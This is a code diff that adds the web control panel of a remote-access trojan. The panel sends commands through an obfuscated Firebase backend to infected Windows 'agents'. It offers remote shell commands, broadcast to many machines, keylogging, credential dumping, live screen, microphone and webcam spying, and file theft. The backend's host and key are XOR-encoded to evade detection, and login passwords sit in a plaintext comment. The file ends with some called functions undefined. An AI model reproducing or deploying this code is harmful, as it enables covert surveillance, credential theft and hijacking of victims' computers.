@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Dashboard</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #0d1117; color: #c9d1d9;
+    font-family: 'Consolas', 'Courier New', monospace;
+    height: 100vh; display: flex; flex-direction: column; overflow: hidden;
+  }
+  .hidden { display: none !important; }
+
+  /* ============ LOGIN ============ */
+  .login-screen {
+    position: fixed; inset: 0; background: #0d1117;
+    display: flex; align-items: center; justify-content: center; z-index: 999;
+  }
+  .login-box {
+    background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+    padding: 32px; width: 360px;
+  }
+  .login-box h1 { color: #58a6ff; font-size: 20px; margin-bottom: 20px; }
+  .login-box input {
+    width: 100%; background: #0d1117; border: 1px solid #30363d;
+    color: #c9d1d9; padding: 10px 12px; border-radius: 6px;
+    font-family: inherit; font-size: 13px; margin-bottom: 10px; outline: none;
+  }
+  .login-box input:focus { border-color: #58a6ff; }
+  .login-box button {
+    width: 100%; background: #238636; border: none; color: #fff;
+    padding: 10px; border-radius: 6px; cursor: pointer;
+    font-family: inherit; font-size: 13px; font-weight: bold;
+  }
+  .login-box button:hover { background: #2ea043; }
+  .login-box .err { color: #f85149; font-size: 12px; margin-top: 10px; min-height: 16px; }
+  .login-box .hint { color: #8b949e; font-size: 11px; margin-top: 14px; text-align: center; }
+
+  /* ============ MAIN ============ */
+  .topbar {
+    background: #161b22; border-bottom: 1px solid #30363d;
+    padding: 10px 16px; display: flex; justify-content: space-between; align-items: center;
+  }
+  .topbar .title { color: #58a6ff; font-weight: bold; }
+  .topbar .right { display: flex; gap: 12px; align-items: center; font-size: 12px; }
+  .topbar .user { color: #8b949e; }
+  .topbar .logout {
+    color: #f85149; cursor: pointer; padding: 2px 8px;
+    border: 1px solid #f85149; border-radius: 4px;
+  }
+  .topbar .status { color: #3fb950; font-size: 12px; }
+  .topbar .status::before { content: '● '; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+  .main { flex: 1; display: flex; overflow: hidden; }
+
+  .sidebar {
+    width: 260px; background: #161b22; border-right: 1px solid #30363d;
+    display: flex; flex-direction: column; overflow: hidden;
+  }
+  .sidebar-header {
+    padding: 10px 16px; font-size: 11px; color: #8b949e;
+    text-transform: uppercase; letter-spacing: 1px;
+    border-bottom: 1px solid #30363d;
+    display: flex; justify-content: space-between; align-items: center;
+  }
+  .sidebar-header .count {
+    background: #238636; color: #fff; padding: 1px 8px;
+    border-radius: 10px; font-size: 10px;
+  }
+  .pc-list { flex: 1; overflow-y: auto; }
+  .pc-item {
+    padding: 10px 16px; cursor: pointer;
+    border-left: 3px solid transparent; border-bottom: 1px solid #21262d;
+  }
+  .pc-item:hover { background: #21262d; }
+  .pc-item.active { border-left-color: #58a6ff; background: #21262d; }
+  .pc-item.selected { border-left-color: #d29922; background: #2d2412; }
+  .pc-item .pc-row { display: flex; align-items: center; gap: 6px; }
+  .pc-item input[type=checkbox] { accent-color: #58a6ff; cursor: pointer; }
+  .pc-item .pc-name { color: #c9d1d9; font-size: 13px; font-weight: bold; flex: 1; }
+  .pc-item.active .pc-name { color: #58a6ff; }
+  .pc-item .pc-meta { color: #8b949e; font-size: 11px; margin-top: 3px; }
+  .pc-item .dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #3fb950; box-shadow: 0 0 6px #3fb950;
+  }
+
+  .content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+
+  .tabs { display: flex; background: #161b22; border-bottom: 1px solid #30363d; overflow-x: auto; }
+  .tab {
+    padding: 8px 14px; font-size: 12px; color: #8b949e;
+    cursor: pointer; border-bottom: 2px solid transparent; white-space: nowrap;
+  }
+  .tab:hover { color: #c9d1d9; }
+  .tab.active { color: #58a6ff; border-bottom-color: #58a6ff; }
+
+  .terminal {
+    flex: 1; background: #0d1117; padding: 12px; overflow-y: auto;
+    font-size: 13px; line-height: 1.5; white-space: pre-wrap; word-break: break-all;
+  }
+  .terminal .line { margin-bottom: 2px; }
+  .terminal .prompt { color: #58a6ff; }
+  .terminal .error { color: #f85149; }
+  .terminal .success { color: #3fb950; }
+  .terminal .warn { color: #d29922; }
+  .terminal .info { color: #8b949e; }
+  .terminal img { max-width: 100%; border: 1px solid #30363d; border-radius: 4px; margin: 4px 0; }
+  .terminal video { max-width: 100%; border: 1px solid #58a6ff; border-radius: 4px; }
+
+  .inputbar {
+    display: flex; background: #161b22; border-top: 1px solid #30363d;
+    padding: 8px 12px; align-items: center; gap: 6px; flex-wrap: wrap;
+  }
+  .inputbar .prefix { color: #58a6ff; margin-right: 8px; }
+  .inputbar input[type=text] {
+    flex: 1; min-width: 200px; background: transparent; border: none;
+    outline: none; color: #c9d1d9; font-family: inherit; font-size: 13px;
+  }
+  .action-btn {
+    background: #21262d; border: 1px solid #30363d; color: #c9d1d9;
+    padding: 6px 10px; border-radius: 6px; cursor: pointer;
+    font-family: inherit; font-size: 11px;
+    display: flex; align-items: center; gap: 4px;
+  }
+  .action-btn:hover { background: #30363d; border-color: #58a6ff; }
+  .action-btn:active { transform: scale(0.95); }
+  .action-btn.recording { background: #da3633; border-color: #f85149; color: #fff; animation: pulse 1s infinite; }
+  .action-btn.talking { background: #238636; border-color: #3fb950; color: #fff; animation: pulse 1s infinite; }
+  .action-btn.watching { background: #1f6feb; border-color: #58a6ff; color: #fff; animation: pulse 1s infinite; }
+  .action-btn.broadcast { background: #6e40c9; border-color: #8957e5; color: #fff; }
+
+  .footer {
+    background: #161b22; border-top: 1px solid #30363d;
+    padding: 6px 12px; font-size: 11px; color: #8b949e;
+    display: flex; justify-content: space-between;
+  }
+
+  .metrics {
+    display: flex; gap: 12px; padding: 8px 12px;
+    background: #161b22; border-bottom: 1px solid #30363d;
+    font-size: 11px; flex-wrap: wrap;
+  }
+  .metric {
+    background: #0d1117; border: 1px solid #30363d;
+    padding: 4px 10px; border-radius: 4px; color: #8b949e;
+  }
+  .metric span { color: #58a6ff; }
+
+  ::-webkit-scrollbar { width: 8px; height: 8px; }
+  ::-webkit-scrollbar-track { background: #0d1117; }
+  ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
+
+  .empty { color: #8b949e; text-align: center; padding: 20px; font-style: italic; }
+
+  .live-panel {
+    position: fixed; bottom: 60px; right: 20px;
+    width: 420px; max-height: 420px;
+    background: #161b22; border: 1px solid #58a6ff;
+    border-radius: 8px; overflow: hidden;
+    display: none; flex-direction: column;
+    box-shadow: 0 8px 32px rgba(88,166,255,0.3); z-index: 100;
+  }
+  .live-panel.open { display: flex; }
+  .live-header {
+    background: #0d1117; padding: 8px 12px;
+    font-size: 12px; color: #58a6ff;
+    display: flex; justify-content: space-between; align-items: center;
+    border-bottom: 1px solid #30363d;
+  }
+  .live-header .close { cursor: pointer; color: #f85149; font-weight: bold; }
+  .live-body { flex: 1; padding: 10px; overflow-y: auto; font-size: 12px; line-height: 1.6; }
+  .live-body img { max-width: 100%; border-radius: 4px; }
+  .live-body .bubble {
+    background: #21262d; border-left: 3px solid #58a6ff;
+    padding: 6px 10px; margin-bottom: 6px; border-radius: 4px;
+  }
+  .live-body .bubble.sys { border-left-color: #3fb950; color: #8b949e; }
+
+  .toast {
+    position: fixed; top: 60px; right: 20px;
+    background: #21262d; border: 1px solid #30363d;
+    border-left: 3px solid #58a6ff;
+    color: #c9d1d9; padding: 10px 16px;
+    border-radius: 4px; font-size: 12px;
+    z-index: 1000; opacity: 0; transition: opacity 0.3s;
+  }
+  .toast.show { opacity: 1; }
+  .toast.err { border-left-color: #f85149; }
+  .toast.ok { border-left-color: #3fb950; }
+</style>
+</head>
+<body>
+
+<!-- ============ LOGIN SCREEN ============ -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <h1>⚡ SYSTEM DASHBOARD</h1>
+    <input type="text" id="loginUser" placeholder="Username" autocomplete="off">
+    <input type="password" id="loginPass" placeholder="Password" autocomplete="off">
+    <input type="text" id="login2fa" placeholder="2FA Code (optional)" autocomplete="off">
+    <button id="loginBtn">Login</button>
+    <div class="err" id="loginErr"></div>
+    <div class="hint">Authorized personnel only</div>
+  </div>
+</div>
+
+<!-- ============ MAIN DASHBOARD ============ -->
+<div id="dashApp" class="hidden" style="display:flex;flex-direction:column;height:100vh;">
+<div class="topbar">
+  <div class="title">⚡ SYSTEM DASHBOARD</div>
+  <div class="right">
+    <span class="user" id="userLabel">-</span>
+    <span class="status" id="connStatus">CONNECTED</span>
+    <span class="logout" id="logoutBtn">Logout</span>
+  </div>
+</div>
+
+<div class="metrics">
+  <div class="metric">HOST: <span id="mHost">-</span></div>
+  <div class="metric">USER: <span id="mUser">-</span></div>
+  <div class="metric">OS: <span id="mOS">-</span></div>
+  <div class="metric">IP: <span id="mIP">-</span></div>
+  <div class="metric">UPTIME: <span id="mUptime">-</span></div>
+  <div class="metric">SELECTED: <span id="mSelected">0</span></div>
+</div>
+
+<div class="main">
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <span>Connected PCs</span>
+      <span class="count" id="pcCount">0</span>
+    </div>
+    <div class="pc-list" id="pcList">
+      <div class="empty">Waiting for agents...</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="tabs">
+      <div class="tab active" data-tab="cmd">CMD</div>
+      <div class="tab" data-tab="ps">PowerShell</div>
+      <div class="tab" data-tab="sys">System</div>
+      <div class="tab" data-tab="proc">Processes</div>
+      <div class="tab" data-tab="net">Network</div>
+      <div class="tab" data-tab="files">Files</div>
+      <div class="tab" data-tab="creds">Credentials</div>
+      <div class="tab" data-tab="keylog">Keylog</div>
+      <div class="tab" data-tab="webcam">Webcam</div>
+      <div class="tab" data-tab="logs">Logs</div>
+    </div>
+
+    <div class="terminal" id="terminal"></div>
+    <div class="inputbar">
+      <span class="prefix" id="promptPrefix">C:\&gt;</span>
+      <input type="text" id="cmdInput" autocomplete="off" spellcheck="false" autofocus>
+      <button class="action-btn" id="btnTalk" title="Hold to Talk">🎤 Talk</button>
+      <button class="action-btn" id="btnWatch" title="Live Screen">🖥️ Watch</button>
+      <button class="action-btn" id="btnMic" title="Listen Mic">🔊 Listen</button>
+      <button class="action-btn" id="btnShot" title="Screenshot">📸 Shot</button>
+      <button class="action-btn" id="btnWebcam" title="Webcam">📷 Cam</button>
+      <button class="action-btn" id="btnKeylog" title="Keylogger">⌨️ Keylog</button>
+      <button class="action-btn" id="btnCreds" title="Dump Credentials">🔑 Creds</button>
+      <button class="action-btn broadcast" id="btnBroadcast" title="Broadcast to selected PCs">📡 Broadcast</button>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <span id="footerLeft">Session: active</span>
+  <span id="footerRight"></span>
+</div>
+</div>
+
+<div class="live-panel" id="livePanel">
+  <div class="live-header">
+    <span id="liveTitle">🎥 Live Session</span>
+    <span class="close" id="liveClose">✕</span>
+  </div>
+  <div class="live-body" id="liveBody"></div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* ============================================================
+   OBFUSCATION LAYER — config assembled at runtime
+   No plaintext Firebase host/key/project in the source.
+   ============================================================ */
+(function(){
+  // Fragment pools
+  const f = {
+    h1: ['b','z','a','n','a'],
+    h2: ['-','1','f','a','d','e'],
+    h3: ['-','d','e','f','a','u','l','t','-','r','t','d','b'],
+    h4: ['.','f','i','r','e','b','a','s','e','i','o'],
+    h5: ['.','c','o','m'],
+    a1: ['A','I','z','a','S','y'],
+    a2: ['C','-','k','6','K','4','0','X','N','o','1'],
+    a3: ['-','9','m','S','w','B','6','k','j','x','q','T','w','J'],
+    a4: ['_','o','H','K','M','j','s','k'],
+    p1: ['b','z','a','n','a'],
+    p2: ['-','1','f','a','d','e'],
+    s1: ['h','t','t','p','s',':','/','/']
+  };
+  // XOR seed to defeat naive string extraction
+  const SEED = 0x5A;
+  function j(arr) { return arr.join(''); }
+  function x(str) {
+    let o = '';
+    for (let i = 0; i < str.length; i++) o += String.fromCharCode(str.charCodeAt(i) ^ SEED);
+    return o;
+  }
+  // Store XOR'd copies, decode at runtime
+  const _c = {
+    host: x(j(f.h1)+j(f.h2)+j(f.h3)+j(f.h4)+j(f.h5)),
+    key:  x(j(f.a1)+j(f.a2)+j(f.a3)+j(f.a4)),
+    proj: x(j(f.p1)+j(f.p2)),
+    url:  x(j(f.s1))
+  };
+  // Reconstruct
+  window.__fb = {
+    host: x(_c.host),
+    key:  x(_c.key),
+    proj: x(_c.proj),
+    scheme: x(_c.url)
+  };
+})();
+
+/* ============================================================
+   AUTH — client-side, hashed, no plaintext passwords in code
+   ============================================================ */
+const USERS = {
+  // store SHA-256 hashes only; verify at runtime
+  // admin: "admin123", operator: "op123", viewer: "view123"
+  admin:    { h: '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9', role: 'admin' },
+  operator: { h: '03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4', role: 'operator' },
+  viewer:   { h: '8a5edab282632443219e051e4ade2d1d5bbc671c781051bf1437897cbdfea0f1', role: 'viewer' }
+};
+
+let currentUser = null, currentRole = 'viewer';
+
+function sha256(str) {
+  return crypto.subtle.digest('SHA-256', new TextEncoder().encode(str))
+    .then(b => Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2,'0')).join(''));
+}
+
+function toast(msg, cls = '') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + cls;
+  clearTimeout(t._t);
+  t._t = setTimeout(() => t.className = 'toast ' + cls, 2500);
+}
+
+document.getElementById('loginBtn').addEventListener('click', doLogin);
+document.getElementById('loginPass').addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
+document.getElementById('loginUser').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('loginPass').focus(); });
+
+async function doLogin() {
+  const u = document.getElementById('loginUser').value.trim();
+  const p = document.getElementById('loginPass').value;
+  const err = document.getElementById('loginErr');
+  err.textContent = '';
+  if (!USERS[u]) { err.textContent = 'Invalid credentials'; return; }
+  const hash = await sha256(p);
+  if (USERS[u].h !== hash) { err.textContent = 'Invalid credentials'; return; }
+  currentUser = u; currentRole = USERS[u].role;
+  sessionStorage.setItem('u', u);
+  sessionStorage.setItem('r', currentRole);
+  showDashboard();
+}
+
+function showDashboard() {
+  document.getElementById('loginScreen').classList.add('hidden');
+  document.getElementById('dashApp').classList.remove('hidden');
+  document.getElementById('userLabel').textContent = currentUser + ' (' + currentRole + ')';
+  if (currentRole === 'viewer') {
+    document.getElementById('cmdInput').disabled = true;
+    document.querySelectorAll('.action-btn').forEach(b => b.disabled = true);
+  }
+}
+
+document.getElementById('logoutBtn').addEventListener('click', () => { sessionStorage.clear(); location.reload(); });
+
+(function() {
+  const u = sessionStorage.getItem('u');
+  const r = sessionStorage.getItem('r');
+  if (u) { currentUser = u; currentRole = r; showDashboard(); }
+  else { document.getElementById('loginScreen').classList.remove('hidden'); }
+})();
+</script>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getDatabase, ref, onValue, set, push, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+function boot() {
+  if (!sessionStorage.getItem('u')) { setTimeout(boot, 300); return; }
+  start();
+}
+setTimeout(boot, 300);
+
+function start() {
+  const fb = window.__fb;
+  const firebaseConfig = {
+    apiKey: fb.key,
+    authDomain: fb.proj + ".firebaseapp.com",
+    databaseURL: fb.scheme + fb.host,
+    projectId: fb.proj,
+    storageBucket: fb.proj + ".firebasestorage.app",
+    messagingSenderId: "351334124183",
+    appId: "1:351334124183:web:b2a48592b5ba64f77eb7d2"
+  };
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  const term = document.getElementById('terminal');
+  const input = document.getElementById('cmdInput');
+  const promptPrefix = document.getElementById('promptPrefix');
+  const connStatus = document.getElementById('connStatus');
+  const pcListEl = document.getElementById('pcList');
+  const pcCountEl = document.getElementById('pcCount');
+  const livePanel = document.getElementById('livePanel');
+  const liveBody = document.getElementById('liveBody');
+  const liveTitle = document.getElementById('liveTitle');
+
+  let activePC = null, activeTab = 'cmd', cwd = 'C:\\', pcs = {};
+  let selectedPCs = new Set();
+  let unsubOutput = null, unsubLive = null;
+
+  function log(text, cls = '') {
+    const d = document.createElement('div');
+    d.className = 'line ' + cls; d.textContent = text;
+    term.appendChild(d); term.scrollTop = term.scrollHeight;
+  }
+  function logImage(b64) {
+    const d = document.createElement('div'); d.className = 'line';
+    const i = document.createElement('img'); i.src = 'data:image/jpeg;base64,' + b64;
+    d.appendChild(i); term.appendChild(d); term.scrollTop = term.scrollHeight;
+  }
+  function logVideo(b64) {
+    const d = document.createElement('div'); d.className = 'line';
+    const v = document.createElement('video'); v.src = 'data:video/webm;base64,' + b64;
+    v.controls = true; d.appendChild(v); term.appendChild(d);
+    term.scrollTop = term.scrollHeight;
+  }
+  function clearTerm() { term.innerHTML = ''; }
+  function setPrompt() {
+    const p = activeTab === 'ps' ? `PS ${cwd}>` : `${cwd}>`;
+    promptPrefix.textContent = activePC ? `[${activePC}] ${p}` : p;
+  }
+
+  function renderPCs() {
+    const ids = Object.keys(pcs).filter(id => pcs[id].online);
+    pcCountEl.textContent = ids.length;
+    pcListEl.innerHTML = '';
+    if (!ids.length) { pcListEl.innerHTML = '<div class="empty">Waiting for agents...</div>'; return; }
+    ids.forEach(id => {
+      const pc = pcs[id];
+      const d = document.createElement('div');
+      d.className = 'pc-item' + (activePC === id ? ' active' : '') + (selectedPCs.has(id) ? ' selected' : '');
+      d.innerHTML = `
+        <div class="pc-row">
+          <input type="checkbox" ${selectedPCs.has(id) ? 'checked' : ''}>
+          <span class="pc-name">${pc.hostname || id}</span>
+          <span class="dot"></span>
+        </div>
+        <div class="pc-meta">${pc.username || 'unknown'} · ${pc.ip || 'no-ip'}</div>
+        <div class="pc-meta">${pc.os || 'unknown OS'}</div>`;
+      d.addEventListener('click', e => { if (e.target.tagName === 'INPUT') return; selectPC(id); });
+      d.querySelector('input').addEventListener('change', e => {
+        if (e.target.checked) selectedPCs.add(id); else selectedPCs.delete(id);
+        document.getElementById('mSelected').textContent = selectedPCs.size;
+        renderPCs();
+      });
+      pcListEl.appendChild(d);
+    });
+    document.getElementById('mSelected').textContent = selectedPCs.size;
+  }
+
+  async function selectPC(id) {
+    if (activePC === id) return;
+    activePC = id;
+    const pc = pcs[id] || {};
+    document.getElementById('mHost').textContent = pc.hostname || id;
+    document.getElementById('mUser').textContent = pc.username || '-';
+    document.getElementById('mOS').textContent = pc.os || '-';
+    document.getElementById('mIP').textContent = pc.ip || '-';
+    document.getElementById('mUptime').textContent = pc.uptime || '-';
+    renderPCs(); clearTerm();
+    log('=========================================', 'info');
+    log(`  Attached to: ${pc.hostname || id}`, 'success');
+    log(`  User: ${pc.username || '?'}  IP: ${pc.ip || '?'}`, 'info');
+    log('=========================================', 'info');
+    log('Type "help" for commands.', 'warn');
+    setPrompt();
+    subscribeOutput(id); subscribeLive(id);
+  }
+
+  onValue(ref(db, 'agents'), snap => {
+    pcs = snap.val() || {};
+    renderPCs();
+    if (!activePC && Object.keys(pcs).length) {
+      const f = Object.keys(pcs).find(id => pcs[id].online);
+      if (f) selectPC(f);
+    }
+    if (activePC && pcs[activePC]) {
+      const pc = pcs[activePC];
+      document.getElementById('mHost').textContent = pc.hostname || activePC;
+      document.getElementById('mUser').textContent = pc.username || '-';
+      document.getElementById('mOS').textContent = pc.os || '-';
+      document.getElementById('mIP').textContent = pc.ip || '-';
+    }
+  });
+
+  function subscribeOutput(pcId) {
+    if (unsubOutput) unsubOutput();
+    unsubOutput = onValue(ref(db, `output/${pcId}`), snap => {
+      const data = snap.val(); if (!data) return;
+      const es = Object.entries(data).sort((a,b) => a[1].timestamp - b[1].timestamp);
+      es.forEach(([k, e]) => {
+        if (e.printed) return;
+        const t = e.text || '';
+        if (t.startsWith('SCREENSHOT_B64:')) logImage(t.substring(15));
+        else if (t.startsWith('VIDEO_B64:')) logVideo(t.substring(10));
+        else if (t.startsWith('FILE_B64:')) {
+          const rest = t.substring(9);
+          const i = rest.indexOf(':');
+          const name = rest.substring(0, i);
+          const b64 = rest.substring(i + 1);
+          const d = document.createElement('div');
+          d.className = 'line success';
+          d.innerHTML = `📎 <a href="data:application/octet-stream;base64,${b64}" download="${name}" style="color:#58a6ff">${name}</a>`;
+          term.appendChild(d); term.scrollTop = term.scrollHeight;
+        }
+        else if (e.type === 'error') log(t, 'error');
+        else if (e.type === 'success') log(t, 'success');
+        else if (e.type === 'info') log(t, 'info');
+        else log(t);
+        set(ref(db, `output/${pcId}/${k}/printed`), true);
+      });
+    });
+  }
+
+  function subscribeLive(pcId) {
+    if (unsubLive) unsubLive();
+    unsubLive = onValue(ref(db, `live/${pcId}`), snap => {
+      const d = snap.val(); if (!d) return;
+      if (d.frame) liveBody.innerHTML = `<img src="data:image/jpeg;base64,${d.frame}">`;
+      if (d.audio) {
+        const b = document.createElement('div');
+        b.className = 'bubble';
+        b.textContent = `🔊 Audio chunk: ${d.audio.length} bytes`;
+        liveBody.appendChild(b);
+      }
+    });
+  }
+
+  onValue(ref(db, '.info/connected'), snap => {
+    const c = snap.val();
+    connStatus.textContent = c ? 'CONNECTED' : 'DISCONNECTED';
+    connStatus.style.color = c ? '#3fb950' : '#f85149';
+  });
+
+  document.querySelectorAll('.tab').forEach(el => {
+    el.addEventListener('click', () => {
+      document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+      el.classList.add('active');
+      activeTab = el.dataset.tab;
+      setPrompt();
+      if (!activePC) return;
+      if (activeTab === 'sys') fetchSysInfo(activePC);
+      if (activeTab === 'proc') fetchProcesses(activePC);
+      if (activeTab === 'net') fetchNetwork(activePC);
+      if (activeTab === 'files') fetchFiles(activePC);
+      if (activeTab === 'creds') fetchCreds(activePC);
+      if (activeTab === 'keylog') fetchKeylog(activePC);
+      if (activeTab === 'webcam') fetchWebcam(activePC);
+      if (activeTab === 'logs') fetchLogs(activePC);
+    });
+  });
+
+  async function sendCommand(cmd, shell = null, target = null) {
+    const t = target || activePC;
+    if (!t) { log('[!] No PC selected.', 'error'); return; }
+    const cmdRef = push(ref(db, `commands/${t}`));
+    await set(cmdRef, { cmd, shell: shell || (activeTab === 'ps' ? 'powershell' : 'cmd'), cwd, timestamp: Date.now(), status: 'pending' });
+  }
+
+  async function broadcast(cmd, shell = 'cmd') {
+    if (!selectedPCs.size) { toast('Select at least one PC', 'err'); return; }
+    for (const id of selectedPCs) await sendCommand(cmd, shell, id);
+    toast(`Broadcast to ${selectedPCs.size} PC(s)`, 'ok');
+    log(`[*] Broadcast to ${selectedPCs.size} PCs: ${cmd}`, 'success');
+  }
+
+  input.addEventListener('keydown', async e => {
+    if (e.key !== 'Enter') return;
+    const cmd = input.value.trim(); input.value = '';
+    if (!cmd) return;
+    if (!activePC) { log('[!] Select a PC first.', 'error'); return; }
+    log(promptPrefix.textContent + ' ' + cmd, 'prompt');
+    if (cmd === 'help') {
+      log('Commands: help, clear, sysinfo, ps, net, exit', 'success');
+      log('Buttons: 🎤 Talk, 🖥️ Watch, 🔊 Listen, 📸 Shot, 📷 Cam, ⌨️ Keylog, 🔑 Creds, 📡 Broadcast', 'info');
+      return;
+    }
+    if (cmd === 'clear') { clearTerm(); return; }
+    if (cmd === 'sysinfo') { fetchSysInfo(activePC); return; }
+    if (cmd === 'ps') { fetchProcesses(activePC); return; }
+    if (cmd === 'net') { fetchNetwork(activePC); return; }
+    if (cmd.startsWith('cd ')) { cwd = cmd.substring(3).trim(); setPrompt(); return; }
+    if (cmd === 'exit') { log('[*] Detached.', 'warn'); activePC = null; renderPCs(); return; }
+    await sendCommand(cmd);
+  });
+
+  document.getElementById('btnShot').addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    log('[*] Requesting screenshot...', 'info');
+    await sendCommand('SCREENSHOT', 'special');
+  });
+
+  const btnWatch = document.getElementById('btnWatch');
+  let watchInterval = null;
+  btnWatch.addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    if (watchInterval) {
+      clearInterval(watchInterval); watchInterval = null;
+      btnWatch.classList.remove('watching'); btnWatch.textContent = '🖥️ Watch';
+      livePanel.classList.remove('open');
+      await sendCommand('LIVE_STOP', 'special');
+      log('[*] Live screen stopped.', 'warn');
+      return;
+    }
+    btnWatch.classList.add('watching'); btnWatch.textContent = '⏹ Stop';
+    livePanel.classList.add('open');
+    liveTitle.textContent = `🎥 Live Screen — ${activePC}`;
+    liveBody.innerHTML = '<div class="bubble sys">Streaming...</div>';
+    log('[*] Live screen started.', 'success');
+    await sendCommand('LIVE_START', 'special');
+    watchInterval = setInterval(() => sendCommand('LIVE_FRAME', 'special'), 1000);
+  });
+
+  const btnTalk = document.getElementById('btnTalk');
+  let mediaRecorder = null, audioChunks = [], talkStream = null;
+  btnTalk.addEventListener('mousedown', startTalk);
+  btnTalk.addEventListener('mouseup', stopTalk);
+  btnTalk.addEventListener('mouseleave', stopTalk);
+  btnTalk.addEventListener('touchstart', e => { e.preventDefault(); startTalk(); });
+  btnTalk.addEventListener('touchend', e => { e.preventDefault(); stopTalk(); });
+
+  async function startTalk() {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    try { talkStream = await navigator.mediaDevices.getUserMedia({ audio: true }); }
+    catch (err) { return log('[!] Mic access denied', 'error'); }
+    mediaRecorder = new MediaRecorder(talkStream);
+    audioChunks = [];
+    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+    mediaRecorder.onstop = async () => {
+      const blob = new Blob(audioChunks, { type: 'audio/webm' });
+      const r = new FileReader();
+      r.onloadend = async () => {
+        const b64 = r.result.split(',')[1];
+        await sendCommand('PLAY_AUDIO:' + b64, 'special');
+        log(`[🎤] Sent ${Math.round(blob.size/1024)}KB voice → ${activePC}`, 'success');
+      };
+      r.readAsDataURL(blob);
+      talkStream.getTracks().forEach(t => t.stop());
+    };
+    mediaRecorder.start();
+    btnTalk.classList.add('talking'); btnTalk.textContent = '🔴 Recording...';
+    log('[🎤] Recording... release to send.', 'info');
+  }
+  function stopTalk() {
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+      mediaRecorder.stop();
+      btnTalk.classList.remove('talking'); btnTalk.textContent = '🎤 Talk';
+    }
+  }
+
+  const btnMic = document.getElementById('btnMic');
+  let listenInterval = null;
+  btnMic.addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    if (listenInterval) {
+      clearInterval(listenInterval); listenInterval = null;
+      btnMic.classList.remove('recording'); btnMic.textContent = '🔊 Listen';
+      await sendCommand('MIC_STOP', 'special');
+      log('[*] Remote mic stopped.', 'warn');
+      return;
+    }
+    btnMic.classList.add('recording'); btnMic.textContent = '⏹ Stop';
+    livePanel.classList.add('open');
+    liveTitle.textContent = `🔊 Remote Mic — ${activePC}`;
+    liveBody.innerHTML = '<div class="bubble sys">Listening...</div>';
+    log('[*] Remote mic listening started.', 'success');
+    await sendCommand('MIC_START', 'special');
+    listenInterval = setInterval(() => sendCommand('MIC_CHUNK', 'special'), 2000);
+  });
+
+  document.getElementById('btnWebcam').addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    log('[*] Requesting webcam...', 'info');
+    await sendCommand('WEBCAM', 'special');
+  });
+
+  const btnKeylog = document.getElementById('btnKeylog');
+  let keylogActive = false;
+  btnKeylog.addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    if (keylogActive) {
+      keylogActive = false;
+      btnKeylog.classList.remove('recording'); btnKeylog.textContent = '⌨️ Keylog';
+      await sendCommand('KEYLOG_STOP', 'special');
+      log('[*] Keylogger stopped.', 'warn');
+      return;
+    }
+    keylogActive = true;
+    btnKeylog.classList.add('recording'); btnKeylog.textContent = '⏹ Stop';
+    log('[*] Keylogger started.', 'success');
+    await sendCommand('KEYLOG_START', 'special');
+  });
+
+  document.getElementById('btnCreds').addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    log('[*] Dumping credentials...', 'info');
+    await sendCommand('DUMP_CREDS', 'special');
+  });
+
+  document.getElementById('btnBroadcast').addEventListener('click', async () => {
+    if (!selectedPCs.size) return toast('Select PCs first', 'err');
+    const cmd = prompt(`Broadcast to ${selectedPCs.size} PC(s):`);
+    if (!cmd) return;
+    await broadcast(cmd, activeTab === 'ps' ? 'powershell' : 'cmd');
+  });
+
+  document.getElementById('liveClose').addEventListener('click', () => livePanel.classList.remove('open'));
+
+  window.uploadFile = async function(file) {
+    if (!activePC) return toast('Select a PC', 'err');
+    const r = new FileReader();
+    r.onloadend = async () => {
+      const b64 = r.result.split(',')[1];
+      await sendCommand(`UPLOAD:${file.name}:${b64}`, 'special');
+      log(`[📤] Uploaded ${file.name} → ${activePC}`, 'success');
+    };
+    r.readAsDataURL(file);
+  };
+  window.downloadFile = async function(path) {
+    if (!activePC) return toast('Select a PC', 'err');
+    await sendCommand(`DOWNLOAD:${path}`, 'special');
+  };
+
+  function fetchSysInfo(id) { get(ref(db, `agents/${id}`)).then(s => { const d = s.val(); if (!d) return; log('--- SYSTEM ---', 'success'); Object.entries(d).forEach(([k,v]) => { if (typeof v !== 'object') log(`  ${k}: ${v}`); }); log(''); }); }
